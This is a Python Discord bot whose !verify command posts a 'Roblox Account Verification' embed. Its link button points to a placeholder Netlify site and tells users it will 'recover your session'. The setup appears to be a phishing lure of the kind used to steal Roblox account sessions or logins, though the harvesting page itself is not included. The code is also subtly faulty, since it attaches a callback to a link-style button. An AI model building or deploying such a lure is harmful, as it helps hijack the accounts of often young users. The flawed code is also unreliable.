import discord
from discord.ext import commands
import os

# Paste your Bot Token here
TOKEN = 'YOUR_BOT_TOKEN_HERE'

# Paste your NETLIFY URL here
VERIFY_LINK = 'https://your-random-name.netlify.app'

bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())

class VerifyView(discord.ui.View):
    @discord.ui.button(label="Verify Roblox Account", style=discord.ButtonStyle.link, url=VERIFY_LINK)
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Opening verification window...", ephemeral=True)

@bot.command(name='verify')
async def verify_cmd(ctx):
    embed = discord.Embed(title="Roblox Account Verification", description="Click the button below to verify your account and recover your session.", color=discord.Color.blue())
    view = VerifyView()
    await ctx.send(embed=embed, view=view)

bot.run(TOKEN)
